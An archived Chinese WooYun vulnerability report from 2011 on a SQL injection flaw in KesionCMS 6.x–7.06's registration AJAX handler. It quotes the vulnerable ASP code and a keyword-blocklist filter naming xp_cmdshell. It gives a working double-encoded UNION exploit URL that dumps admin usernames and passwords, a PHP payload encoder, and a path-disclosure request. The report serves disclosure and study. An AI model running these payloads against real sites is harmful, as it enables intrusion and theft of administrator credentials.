@@ -1,0 +1,275 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		科讯 6.x - 7.06 SQL 注射漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		科讯 6.x - 7.06 SQL 注射漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/My5t3ry">My5t3ry</a> 
+</li><li>提交时间：		2011-07-27 20:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-07-27：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2011-07-27：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail"></p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">Author:my5t3ry<br />
+<br />
+转载请注明：t00ls.net<br />
+<br />
+漏洞位于注册页面的\User\Reg\RegAjax.asp 中的24 - 46行 和 254 -270 行 代码如下：<br />
+<br />
+</p><pre><code>Class Ajax_Check<br />
+        Private KS<br />
+                Private Sub Class_Initialize()<br />
+                  Set KS=New PublicCls<br />
+                End Sub<br />
+        Private Sub Class_Terminate()<br />
+                 Set KS=Nothing<br />
+                End Sub<br />
+                Public Sub Kesion()<br />
+                  <br />
+                  Select Case KS.S(&quot;Action&quot;)<br />
+                   Case &quot;checkusername&quot;<br />
+                    Call CheckUserName()<br />
+                   Case &quot;checkemail&quot;<br />
+                    Call CheckEmail()<br />
+                   Case &quot;checkcode&quot;<br />
+                    Call CheckCode()<br />
+                   Case &quot;getregform&quot;<br />
+                    Call GetRegForm()<br />
+                   Case &quot;getcityoption&quot;<br />
+                    Call getCityOption()<br />
+                  End Select<br />
+                End Sub<br />
+<br />
+……略去无关代码<br />
+<br />
+                Sub getCityOption()<br />
+                  Dim Province,XML,Node<br />
+                  Province=UnEscape(KS.S(&quot;Province&quot;))  //注意这里<br />
+                  Dim RS:Set RS=Server.CreateObject(&quot;ADODB.RECORDSET&quot;)<br />
+                  RS.Open &quot;Select top 200 a.ID,a.City From KS_Province a Inner Join KS_Province b On A.ParentID=B.ID Where B.City=&#039;&quot; &amp; Province &amp; &quot;&#039; order by a.orderid,a.id&quot;,conn,1,1<br />
+                  If Not RS.Eof Then<br />
+                    Set XML=KS.RsToXml(Rs,&quot;row&quot;,&quot;&quot;)<br />
+                  End If<br />
+                  RS.Close : Set RS=Nothing<br />
+                  If IsObject(XML) Then<br />
+                   For Each Node In XML.DocumentElement.SelectNodes(&quot;row&quot;)<br />
+                      KS.Echo &quot;&lt;option value=&quot;&quot;&quot; &amp; node.SelectSingleNode(&quot;@city&quot;).text &amp;&quot;&quot;&quot;&gt;&quot; &amp; node.SelectSingleNode(&quot;@city&quot;).text &amp;&quot;&lt;/option&gt;&quot;<br />
+                   Next<br />
+                  End If<br />
+                  Set XML=Nothing<br />
+                End Sub<br />
+End Class</code></pre><p class='detail'><br />
+<br />
+以上代码中的Province=UnEscape(KS.S(&quot;Province&quot;)) 调用自定义函数KS.S进行过滤，接着又调用UnEscape函数解码！<br />
+<br />
+<br />
+<br />
+其中KS.S 函数 与UnEscape函数 原型如下:<br />
+<br />
+<br />
+<br />
+        Function DelSql(Str)<br />
+<br />
+                Dim SplitSqlStr,SplitSqlArr,I<br />
+<br />
+                SplitSqlStr=&quot;dbcc|alter|drop|*|and |exec|or |insert|select|delete|update|count |master|truncate|declare|char|mid|chr|set |where|xp_cmdshell&quot;<br />
+<br />
+                SplitSqlArr = Split(SplitSqlStr,&quot;|&quot;)<br />
+<br />
+                For I=LBound(SplitSqlArr) To Ubound(SplitSqlArr)<br />
+<br />
+                        If Instr(LCase(Str),SplitSqlArr(I))&gt;0 Then<br />
+<br />
+                                Die &quot;&lt;script&gt;alert(&#039;系统警告！\n\n1、您提交的数据有恶意字符&quot; &amp; SplitSqlArr(I) &amp;&quot;;\n2、您的数据已经被记录;\n3、您的IP：&quot;&amp;GetIP&amp;&quot;;\n4、操作日期：&quot;&amp;Now&amp;&quot;;\n                Powered By Kesion.Com!&#039;);window.close();&lt;/script&gt;&quot;<br />
+<br />
+                        End if<br />
+<br />
+                Next<br />
+<br />
+                DelSql = Str<br />
+<br />
+    End Function<br />
+<br />
+        &#039;取得Request.Querystring 或 Request.Form 的值<br />
+<br />
+        Public Function S(Str)<br />
+<br />
+         S = DelSql(Replace(Replace(Request(Str), &quot;&#039;&quot;, &quot;&quot;), &quot;&quot;&quot;&quot;, &quot;&quot;))<br />
+<br />
+        End Function<br />
+<br />
+<br />
+<br />
+这里编码出现混乱，产生了与php的二次编码类似的漏洞，利用比较简单，可以union：<br />
+<br />
+<br />
+<br />
+http://localhost/user/reg/regajax.asp?action=getcityoption&amp;province=%2527%2520%2575%256e%2569%256f%256e%2520%2553%2565%256c%2565%2563%2574%2520%2574%256f%2570%2520%2531%2530%2520%2541%2564%256d%2569%256e%2549%2544%252c%2555%2573%2565%2572%254e%2561%256d%2565%2526%2563%2568%2572%2528%2531%2532%2534%2529%2526%2550%2561%2573%2573%2557%256f%2572%2564%2520%2546%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500<br />
+<br />
+<br />
+<br />
+上面的利用针对ACCESS，MSSQL需要改下SQL语句：<br />
+<br />
+<br />
+<br />
+&lt;?php<br />
+<br />
+$str = &quot;&#039; union Select top 10 AdminID,UserName&amp;chr(124)&amp;PassWord From KS_Admin&quot;;<br />
+<br />
+for ($i=0; $i&lt;=strlen($str); $i++){<br />
+<br />
+        $temp .= &quot;%25&quot;.base_convert(ord($str[$i]),10,16);<br />
+<br />
+}<br />
+<br />
+echo $temp.&quot;0&quot;;<br />
+<br />
+?&gt;<br />
+<br />
+<br />
+<br />
+修改&#039; union Select top 10 AdminID,UserName&amp;chr(124)&amp;PassWord From KS_Admin为相应的SQL语句即可。（MSSQL直接备份差异比较方便）<br />
+<br />
+<br />
+<br />
+因为解码的时候进行了CLng类型转换，提交字符可以使其报错从而爆出物理路径<br />
+<br />
+爆物理路径:http://localhost/user/reg/regajax.asp?action=getcityoption&amp;province=%25i </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/27201302f85fafe1a330d317c3c0134551e36bf2.jpg" target="_blank"><img src="../images/27201302f85fafe1a330d317c3c0134551e36bf2.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/272013296ad2305450b79b79ef81f75da01090ac.jpg" target="_blank"><img src="../images/272013296ad2305450b79b79ef81f75da01090ac.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/My5t3ry" title="My5t3ry">My5t3ry</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02579" title="科讯 6.x - 7.06 SQL 注射漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2579";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
